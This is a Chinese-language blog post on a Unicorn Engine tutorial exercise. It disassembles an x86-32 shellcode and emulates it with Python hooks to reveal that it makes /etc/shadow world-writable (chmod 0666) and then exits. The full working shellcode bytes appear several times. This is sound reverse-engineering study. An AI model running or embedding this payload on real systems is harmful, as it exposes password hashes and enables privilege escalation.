---
layout: post
title:  "Unicorn engine tutorial 練習 - part 3"
date:   2019-04-27 21:29:24 +0800
categories: Reversing
---

## 前言

上一篇把unicorn task 1 完成了，接下來就繼續造這篇[Unicorn Engine tutorial][Unicorn_Engine_tutorial]來解下一題摟~

## 練習 2

這次的題目是要分析一個shellcode:  
`shellcode = "\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"`

透過pwntool來反組譯  
```python
In [1]: from pwn import *

In [2]: shellcode = b"\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\
   ...: xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9
   ...: \x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"

In [3]: print(disasm(shellcode))
```

```asm
   0:   e8 ff ff ff ff          call   0x4
   5:   c0 5d 6a 05             rcr    BYTE PTR [ebp+0x6a],0x5
   9:   5b                      pop    ebx
   a:   29 dd                   sub    ebp,ebx
   c:   83 c5 4e                add    ebp,0x4e
   f:   89 e9                   mov    ecx,ebp
  11:   6a 02                   push   0x2
  13:   03 0c 24                add    ecx,DWORD PTR [esp]
  16:   5b                      pop    ebx
  17:   31 d2                   xor    edx,edx
  19:   66 ba 12 00             mov    dx,0x12
  1d:   8b 39                   mov    edi,DWORD PTR [ecx]
  1f:   c1 e7 10                shl    edi,0x10
  22:   c1 ef 10                shr    edi,0x10
  25:   81 e9 fe ff ff ff       sub    ecx,0xfffffffe
  2b:   8b 45 00                mov    eax,DWORD PTR [ebp+0x0]
  2e:   c1 e0 10                shl    eax,0x10
  31:   c1 e8 10                shr    eax,0x10
  34:   89 c3                   mov    ebx,eax
  36:   09 fb                   or     ebx,edi
  38:   21 f8                   and    eax,edi
  3a:   f7 d0                   not    eax
  3c:   21 d8                   and    eax,ebx
  3e:   66 89 45 00             mov    WORD PTR [ebp+0x0],ax
  42:   83 c5 02                add    ebp,0x2
  45:   4a                      dec    edx
  46:   85 d2                   test   edx,edx
  48:   0f 85 cf ff ff ff       jne    0x1d
  4e:   ec                      in     al,dx
  4f:   37                      aaa
  50:   75 5d                   jne    0xaf
  52:   7a 05                   jp     0x59
  54:   28 ed                   sub    ch,ch
  56:   24 ed                   and    al,0xed
  58:   24 ed                   and    al,0xed
  5a:   0b 88 7f eb 50 98       or     ecx,DWORD PTR [eax-0x67af1481]
  60:   38 f9                   cmp    cl,bh
  62:   5c                      pop    esp
  63:   96                      xchg   esi,eax
  64:   2b 96 70 fe c6 ff       sub    edx,DWORD PTR [esi-0x390190]
  6a:   c6                      (bad)
  6b:   ff 9f 32 1f 58 1e       call   FWORD PTR [edi+0x1e581f32]
  71:   00 d3                   add    bl,dl
  73:   80                      .byte 0x80
```

### Hook

而因為作者有提到這句話`Note that the architecture is x86-32 now. List of syscalls numbers can be found here.`，猜測應該跟system call有關，所以就先來hook system call。  

```python
from unicorn import *
from unicorn.x86_const import *

shellcode = b"\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"

base_adr = 0x400000
stack_adr = 0x0
stack_size = 1024 * 1024

def hook_code(mu, address, size, user_data):  
    # print('>>> Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))
    op_code = mu.mem_read(address, size)
    if op_code == b"\xcd\x80":
        call_number = mu.reg_read(UC_X86_REG_EAX)
        param_1 = mu.reg_read(UC_X86_REG_EBX)
        param_2 = mu.reg_read(UC_X86_REG_ECX)
        param_3 = mu.reg_read(UC_X86_REG_EDX)
        param_4 = mu.reg_read(UC_X86_REG_ESI)
        param_5 = mu.reg_read(UC_X86_REG_EDI)

        print("[*] System call")
        print(f"Call Number: {call_number}\n" \
              f"Param 1    : {param_1}({hex(param_1)})\n" \
              f"Param 2    : {param_2}({hex(param_2)})\n" \
              f"Param 3    : {param_3}({hex(param_3)})\n" \
              f"Param 4    : {param_4}({hex(param_4)})\n" \
              f"Param 5    : {param_5}({hex(param_5)})\n")
        mu.reg_write(UC_X86_REG_EIP, address + size)

try:
    mu = Uc(UC_ARCH_X86, UC_MODE_32)
    mu.mem_map(base_adr, 1024 * 1024)
    mu.mem_map(stack_adr, stack_size)

    mu.mem_write(base_adr, shellcode)
    mu.reg_write(UC_X86_REG_ESP, stack_adr + stack_size)
    mu.hook_add(UC_HOOK_CODE, hook_code)

    mu.emu_start(base_adr, base_adr + len(shellcode))
except UcError as e:
    print("ERROR: %s" % e)
```

output:  

```text
$ python task2_solve.py
[*] System call
Call Number: 15
Param 1    : 4194392(0x400058)
Param 2    : 438(0x1b6)
Param 3    : 0(0x0)
Param 4    : 0(0x0)
Param 5    : 32979(0x80d3)

[*] System call
Call Number: 1
Param 1    : 4194392(0x400058)
Param 2    : 438(0x1b6)
Param 3    : 0(0x0)
Param 4    : 0(0x0)
Param 5    : 32979(0x80d3)
```

### 分析

分析system call function ([system_call_table][system_call_table]):  

Call number 15: `sys_chmod`  
sys_chmod(const char __user *filename, mode_t mode)  

Call number 1: `sys_exit`  

分析完後:  

```python
from unicorn import *
from unicorn.x86_const import *

shellcode = b"\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"

base_adr = 0x400000
stack_adr = 0x0
stack_size = 1024 * 1024

dict_system_call = {
    1: "sys_exit",
    15: "sys_chmod", 
}

def hook_code(mu, address, size, user_data):  
    # print('>>> Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))
    op_code = mu.mem_read(address, size)
    if op_code == b"\xcd\x80":
        call_number = mu.reg_read(UC_X86_REG_EAX)
        param_1 = mu.reg_read(UC_X86_REG_EBX)
        param_2 = mu.reg_read(UC_X86_REG_ECX)
        param_3 = mu.reg_read(UC_X86_REG_EDX)
        param_4 = mu.reg_read(UC_X86_REG_ESI)
        param_5 = mu.reg_read(UC_X86_REG_EDI)
        system_call_name = dict_system_call[call_number]

        print("[*] System call")
        print(f"Call Number: {call_number}({system_call_name})")

        if system_call_name == "sys_chmod":
            file = mu.mem_read(param_1, 64).split(b"\x00")[0]
            print(f"Param 1    : {param_1}({hex(param_1)}) -> {file}")
            print(f"Param 2    : {param_2}({hex(param_2)}) -> {oct(param_2)}")
        else:
            print(f"Param 1    : {param_1}({hex(param_1)})")
        print("")
        mu.reg_write(UC_X86_REG_EIP, address + size)

try:
    mu = Uc(UC_ARCH_X86, UC_MODE_32)
    mu.mem_map(base_adr, 1024 * 1024)
    mu.mem_map(stack_adr, stack_size)

    mu.mem_write(base_adr, shellcode)
    mu.reg_write(UC_X86_REG_ESP, stack_adr + stack_size)
    mu.hook_add(UC_HOOK_CODE, hook_code)

    mu.emu_start(base_adr, base_adr + len(shellcode))
except UcError as e:
    print("ERROR: %s" % e)
```

output:  

```text
[*] System call
Call Number: 15(sys_chmod)
Param 1    : 4194392(0x400058) -> bytearray(b'/etc/shadow')
Param 2    : 438(0x1b6) -> 0o666

[*] System call
Call Number: 1(sys_exit)
Param 1    : 4194392(0x400058)
```

應該就是一個會去將`/etc/shadow`權限改成666的shellcode。  

練習2就完成瞜~  

[Unicorn_Engine_tutorial]:http://eternal.red/2018/unicorn-engine-tutorial/  
[system_call_table]:https://syscalls.kernelgrok.com/  